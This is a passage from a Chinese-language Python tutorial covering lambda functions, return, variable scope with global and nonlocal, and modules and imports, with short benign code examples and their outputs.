<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a,b,*,c)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> a+b+c</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment"># 报错</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: f() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># 正常</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>python 使用 lambda 来创建匿名函数。</p>
<p>所谓匿名，意即不再使用 def 语句这样标准的形式定义一个函数。<br>· lambda 只是一个表达式，函数体比 def 简单很多。<br>· lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。<br>· lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数。<br>· 虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p>lambda 函数的语法只包含一个语句，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression</span><br></pre></td></tr></table></figure>
<p>如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line">sum = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"相加后的值为 : "</span>, sum( <span class="number">10</span>, <span class="number">20</span> ))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"相加后的值为 : "</span>, sum( <span class="number">20</span>, <span class="number">20</span> ))</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">相加后的值为 :  30</span><br><span class="line">相加后的值为 :  40</span><br></pre></td></tr></table></figure>
<h3 id="return语句"><a href="#return语句" class="headerlink" title="return语句"></a>return语句</h3><p>return [表达式] 语句用于退出函数，选择性地向调用方返回一个表达式。不带参数值的return语句返回None。之前的例子都没有示范如何返回数值，以下实例演示了 return 语句的用法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">( arg1, arg2 )</span>:</span></span><br><span class="line">   <span class="comment"># 返回2个参数的和."</span></span><br><span class="line">   total = arg1 + arg2</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"函数内 : "</span>, total)</span><br><span class="line">   <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line">total = sum( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"函数外 : "</span>, total)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">函数内 :  30</span><br><span class="line">函数外 :  30</span><br></pre></td></tr></table></figure>
<h3 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h3><p>Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。</p>
<p>变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称。Python的作用域一共有4种，分别是：<br>· L （Local） 局部作用域<br>· E （Enclosing） 闭包函数外的函数中<br>· G （Global） 全局作用域<br>· B （Built-in） 内建作用域<br>以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内建中找。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = int(<span class="number">2.9</span>)  <span class="comment"># 内建作用域</span></span><br><span class="line"> </span><br><span class="line">g_count = <span class="number">0</span>  <span class="comment"># 全局作用域</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span><span class="params">()</span>:</span></span><br><span class="line">    o_count = <span class="number">1</span>  <span class="comment"># 闭包函数外的函数中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">()</span>:</span></span><br><span class="line">        i_count = <span class="number">2</span>  <span class="comment"># 局部作用域</span></span><br></pre></td></tr></table></figure>
<p>Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if/elif/else/、try/except、for/while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">... </span> msg = <span class="string">'I am from Runoob'</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>msg</span><br><span class="line"><span class="string">'I am from Runoob'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>实例中 msg 变量定义在 if 语句块中，但外部还是可以访问的。</p>
<p>如果将 msg 定义在函数中，则它就是局部变量，外部不能访问：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    msg_inner = <span class="string">'I am from Runoob'</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>msg_inner</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'msg_inner'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>从报错的信息上看，说明了 msg_inner 未定义，无法使用，因为它是局部变量，只有在函数内可以使用。</p>
<h4 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h4><p>定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域。</p>
<p>局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问。调用函数时，所有在函数内声明的变量名称都将被加入到作用域中。如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">total = <span class="number">0</span> <span class="comment"># 这是一个全局变量</span></span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">( arg1, arg2 )</span>:</span></span><br><span class="line">    <span class="comment">#返回2个参数的和."</span></span><br><span class="line">    total = arg1 + arg2 <span class="comment"># total在这里是局部变量.</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"函数内是局部变量 : "</span>, total)</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用sum函数</span></span><br><span class="line">sum( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"函数外是全局变量 : "</span>, total)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">函数内是局部变量 :  30</span><br><span class="line">函数外是全局变量 :  0</span><br></pre></td></tr></table></figure>
<h4 id="global-和-nonlocal关键字"><a href="#global-和-nonlocal关键字" class="headerlink" title="global 和 nonlocal关键字"></a>global 和 nonlocal关键字</h4><p>当内部作用域想修改外部作用域的变量时，就要用到global和nonlocal关键字了。</p>
<p>以下实例修改全局变量 num：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> num  <span class="comment"># 需要使用 global 关键字声明</span></span><br><span class="line">    print(num) </span><br><span class="line">    num = <span class="number">123</span></span><br><span class="line">    print(num)</span><br><span class="line">fun1()</span><br><span class="line">print(num)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">123</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了，如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span><span class="params">()</span>:</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num   <span class="comment"># nonlocal关键字声明</span></span><br><span class="line">        num = <span class="number">100</span></span><br><span class="line">        print(num)</span><br><span class="line">    inner()</span><br><span class="line">    print(num)</span><br><span class="line">outer()</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100</span><br><span class="line">100</span><br></pre></td></tr></table></figure>
<p>另外有一种特殊情况，假设下面这段代码被运行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    a = a + <span class="number">1</span></span><br><span class="line">    print(a)</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>
<p>以上程序执行，报错信息如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">7</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    test()</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">5</span>, <span class="keyword">in</span> test</span><br><span class="line">    a = a + <span class="number">1</span></span><br><span class="line">UnboundLocalError: local variable <span class="string">'a'</span> referenced before assignment</span><br></pre></td></tr></table></figure>
<p>错误信息为局部作用域引用错误，因为 test 函数中的 a 使用的是局部，未定义，无法修改。</p>
<p>修改 a 为全局变量，通过函数参数传递，可以正常执行输出结果为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(a)</span>:</span></span><br><span class="line">    a = a + <span class="number">1</span></span><br><span class="line">    print(a)</span><br><span class="line">test(a)</span><br></pre></td></tr></table></figure>
<p>执行输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11</span><br></pre></td></tr></table></figure>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>在前面的几个章节中我们脚本上是用 python 解释器来编程，如果你从 Python 解释器退出再进入，那么你定义的所有的方法和变量就都消失了。</p>
<p>为此 Python 提供了一个办法，把这些定义存放在文件中，为一些脚本或者交互式的解释器实例使用，这个文件被称为模块。</p>
<p>模块是一个包含所有你定义的函数和变量的文件，其后缀名是.py。模块可以被别的程序引入，以使用该模块中的函数等功能。这也是使用 python 标准库的方法。</p>
<p>下面是一个使用 python 标准库中模块的例子。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># 文件名: using_sys.py</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'命令行参数如下:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sys.argv:</span><br><span class="line">   print(i)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'\n\nPython 路径为：'</span>, sys.path, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p>执行结果如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python using_sys.py 参数<span class="number">1</span> 参数<span class="number">2</span></span><br><span class="line">命令行参数如下:</span><br><span class="line">using_sys.py</span><br><span class="line">参数<span class="number">1</span></span><br><span class="line">参数<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Python 路径为： [<span class="string">'/root'</span>, <span class="string">'/usr/lib/python3.4'</span>, <span class="string">'/usr/lib/python3.4/plat-x86_64-linux-gnu'</span>, <span class="string">'/usr/lib/python3.4/lib-dynload'</span>, <span class="string">'/usr/local/lib/python3.4/dist-packages'</span>, <span class="string">'/usr/lib/python3/dist-packages'</span>]</span><br></pre></td></tr></table></figure>
<p>· import sys 引入 python 标准库中的 sys.py 模块；这是引入某一模块的方法。<br>· sys.argv 是一个包含命令行参数的列表。<br>· sys.path 包含了一个 Python 解释器自动查找所需模块的路径的列表。</p>
<h3 id="import语句"><a href="#import语句" class="headerlink" title="import语句"></a>import语句</h3><p>想使用 Python 源文件，只需在另一个源文件里执行 import 语句，语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module1[, module2[,... moduleN]</span><br></pre></td></tr></table></figure>
<p>当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。</p>
<p>搜索路径是一个解释器会先进行搜索的所有目录的列表。如想要导入模块 support，需要把命令放在脚本的顶端：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Filename: support.py</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_func</span><span class="params">( par )</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Hello : "</span>, par)</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<p>test.py 引入 support 模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Filename: test.py</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> support</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 现在可以调用模块里包含的函数了</span></span><br><span class="line">support.print_func(<span class="string">"Runoob"</span>)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 test.py </span><br><span class="line">Hello :  Runoob</span><br></pre></td></tr></table></figure>
<p>一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。</p>
<p>当我们使用import语句的时候，Python解释器是怎样找到对应的文件的呢？</p>
<p>这就涉及到Python的搜索路径，搜索路径是由一系列目录名组成的，Python解释器就依次从这些目录中去寻找所引入的模块。</p>
<p>这看起来很像环境变量，事实上，也可以通过定义环境变量的方式来确定搜索路径。</p>
<p>搜索路径是在Python编译或安装的时候确定的，安装新的库应该也会修改。搜索路径被存储在sys模块中的path变量，做一个简单的实验，在交互式解释器中，输入以下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line">[<span class="string">''</span>, <span class="string">'/usr/lib/python3.4'</span>, <span class="string">'/usr/lib/python3.4/plat-x86_64-linux-gnu'</span>, <span class="string">'/usr/lib/python3.4/lib-dynload'</span>, <span class="string">'/usr/local/lib/python3.4/dist-packages'</span>, <span class="string">'/usr/lib/python3/dist-packages'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>sys.path 输出是一个列表，其中第一项是空串’’，代表当前目录（若是从一个脚本中打印出来的话，可以更清楚地看出是哪个目录），亦即我们执行python解释器的目录（对于脚本的话就是运行的脚本所在的目录）。</p>
<p>因此若像我一样在当前目录下存在与要引入模块同名的文件，就会把要引入的模块屏蔽掉。</p>
<p>了解了搜索路径的概念，就可以在脚本中修改sys.path来引入一些不在搜索路径中的模块。</p>
<p>现在，在解释器的当前目录或者 sys.path 中的一个目录里面来创建一个fibo.py的文件，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 斐波那契(fibonacci)数列模块</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span>    <span class="comment"># 定义到 n 的斐波那契数列</span></span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        print(b, end=<span class="string">' '</span>)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    print()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib2</span><span class="params">(n)</span>:</span> <span class="comment"># 返回到 n 的斐波那契数列</span></span><br><span class="line">    result = []</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        result.append(b)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>然后进入Python解释器，使用下面的命令导入这个模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> fibo</span><br></pre></td></tr></table></figure>
<p>这样做并没有把直接定义在fibo中的函数名称写入到当前符号表里，只是把模块fibo的名字写到了那里。</p>
<p>可以使用模块名称来访问函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;fibo.fib(<span class="number">1000</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span> <span class="number">610</span> <span class="number">987</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fibo.fib2(<span class="number">100</span>)</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fibo.__name__</span><br><span class="line"><span class="string">'fibo'</span></span><br></pre></td></tr></table></figure>
<p>如果你打算经常使用一个函数，你可以把它赋给一个本地的名称：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib = fibo.fib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib(<span class="number">500</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br></pre></td></tr></table></figure>
<h3 id="from…import语句"><a href="#from…import语句" class="headerlink" title="from…import语句"></a>from…import语句</h3><p>Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中，语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> name1[, name2[, ... nameN]]</span><br></pre></td></tr></table></figure>
<p>例如，要导入模块 fibo 的 fib 函数，使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fibo <span class="keyword">import</span> fib, fib2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib(<span class="number">500</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br></pre></td></tr></table></figure>
<p>这个声明不会把整个fibo模块导入到当前的命名空间中，它只会将fibo里的fib函数引入进来。</p>
<h3 id="from-…-import-语句"><a href="#from-…-import-语句" class="headerlink" title="from … import * 语句"></a>from … import * 语句</h3><p>把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<p>这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。</p>
<h3 id="深入模块"><a href="#深入模块" class="headerlink" title="深入模块"></a>深入模块</h3><p>模块除了方法定义，还可以包括可执行的代码。这些代码一般用来初始化这个模块。这些代码只有在第一次被导入时才会被执行。</p>
<p>每个模块有各自独立的符号表，在模块内部为所有的函数当作全局符号表来使用。</p>
<p>所以，模块的作者可以放心大胆的在模块内部使用这些全局变量，而不用担心把其他用户的全局变量搞花。</p>
<p>从另一个方面，当你确实知道你在做什么的话，你也可以通过 modname.itemname 这样的表示法来访问模块内的函数。</p>
<p>模块是可以导入其他模块的。在一个模块（或者脚本，或者其他地方）的最前面使用 import 来导入一个模块，当然这只是一个惯例，而不是强制的。被导入的模块的名称将被放入当前操作的模块的符号表中。</p>
<p>还有一种导入的方法，可以使用 import 直接把模块内（函数，变量的）名称导入到当前操作模块。比如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fibo <span class="keyword">import</span> fib, fib2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib(<span class="number">500</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br></pre></td></tr></table></figure>
<p>这种导入的方法不会把被导入的模块的名称放在当前的字符表中（所以在这个例子里面，fibo 这个名称是没有定义的）。</p>
<p>这还有一种方法，可以一次性的把模块中的所有（函数，变量）名称都导入到当前模块的字符表:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fibo <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib(<span class="number">500</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br></pre></td></tr></table></figure>
<p>这将把所有的名字都导入进来，但是那些由单一下划线（_）开头的名字不在此例。大多数情况， Python程序员不使用这种方法，因为引入的其它来源的命名，很可能覆盖了已有的定义。</p>
<h3 id="name属性"><a href="#name属性" class="headerlink" title="name属性"></a><strong>name</strong>属性</h3><p>一个模块被另一个程序第一次引入时，其主程序将运行。如果我们想在模块被引入时，模块中的某一程序块不执行，我们可以用<strong>name</strong>属性来使该程序块仅在该模块自身运行时执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Filename: using_name.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   print(<span class="string">'程序自身在运行'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   print(<span class="string">'我来自另一模块'</span>)</span><br></pre></td></tr></table></figure>
<p>运行输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python using_name.py</span><br><span class="line">程序自身在运行</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python</span><br><span class="line">&gt;&gt;&gt; import using_name</span><br><span class="line">我来自另一模块</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>说明： 每个模块都有一个<strong>name</strong>属性，当其值是’<strong>main</strong>‘时，表明该模块自身在运行，否则是被引入。</p>
<p>说明：<strong>name</strong> 与 <strong>main</strong> 底下是双下划线， _ _ 是这样去掉中间的那个空格。</p>
<h3 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir() 函数"></a>dir() 函数</h3><p>内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> fibo, sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(fibo)</span><br><span class="line">[<span class="string">'__name__'</span>, <span class="string">'fib'</span>, <span class="string">'fib2'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(sys)  </span><br><span class="line">[<span class="string">'__displayhook__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__excepthook__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>,</span><br><span class="line"> <span class="string">'__package__'</span>, <span class="string">'__stderr__'</span>, <span class="string">'__stdin__'</span>, <span class="string">'__stdout__'</span>,</span><br><span class="line"> <span class="string">'_clear_type_cache'</span>, <span class="string">'_current_frames'</span>, <span class="string">'_debugmallocstats'</span>, <span class="string">'_getframe'</span>,</span><br><span class="line"> <span class="string">'_home'</span>, <span class="string">'_mercurial'</span>, <span class="string">'_xoptions'</span>, <span class="string">'abiflags'</span>, <span class="string">'api_version'</span>, <span class="string">'argv'</span>,</span><br><span class="line"> <span class="string">'base_exec_prefix'</span>, <span class="string">'base_prefix'</span>, <span class="string">'builtin_module_names'</span>, <span class="string">'byteorder'</span>,</span><br><span class="line"> <span class="string">'call_tracing'</span>, <span class="string">'callstats'</span>, <span class="string">'copyright'</span>, <span class="string">'displayhook'</span>,</span><br><span class="line"> <span class="string">'dont_write_bytecode'</span>, <span class="string">'exc_info'</span>, <span class="string">'excepthook'</span>, <span class="string">'exec_prefix'</span>,</span><br><span class="line"> <span class="string">'executable'</span>, <span class="string">'exit'</span>, <span class="string">'flags'</span>, <span class="string">'float_info'</span>, <span class="string">'float_repr_style'</span>,</span><br><span class="line"> <span class="string">'getcheckinterval'</span>, <span class="string">'getdefaultencoding'</span>, <span class="string">'getdlopenflags'</span>,</span><br><span class="line"> <span class="string">'getfilesystemencoding'</span>, <span class="string">'getobjects'</span>, <span class="string">'getprofile'</span>, <span class="string">'getrecursionlimit'</span>,</span><br><span class="line"> <span class="string">'getrefcount'</span>, <span class="string">'getsizeof'</span>, <span class="string">'getswitchinterval'</span>, <span class="string">'gettotalrefcount'</span>,</span><br><span class="line"> <span class="string">'gettrace'</span>, <span class="string">'hash_info'</span>, <span class="string">'hexversion'</span>, <span class="string">'implementation'</span>, <span class="string">'int_info'</span>,</span><br><span class="line"> <span class="string">'intern'</span>, <span class="string">'maxsize'</span>, <span class="string">'maxunicode'</span>, <span class="string">'meta_path'</span>, <span class="string">'modules'</span>, <span class="string">'path'</span>,</span><br><span class="line"> <span class="string">'path_hooks'</span>, <span class="string">'path_importer_cache'</span>, <span class="string">'platform'</span>, <span class="string">'prefix'</span>, <span class="string">'ps1'</span>,</span><br><span class="line"> <span class="string">'setcheckinterval'</span>, <span class="string">'setdlopenflags'</span>, <span class="string">'setprofile'</span>, <span class="string">'setrecursionlimit'</span>,</span><br><span class="line"> <span class="string">'setswitchinterval'</span>, <span class="string">'settrace'</span>, <span class="string">'stderr'</span>, <span class="string">'stdin'</span>, <span class="string">'stdout'</span>,</span><br><span class="line"> <span class="string">'thread_info'</span>, <span class="string">'version'</span>, <span class="string">'version_info'</span>, <span class="string">'warnoptions'</span>]</span><br></pre></td></tr></table></figure>
<p>如果没有给定参数，那么 dir() 函数会罗列出当前定义的所有名称:</p>
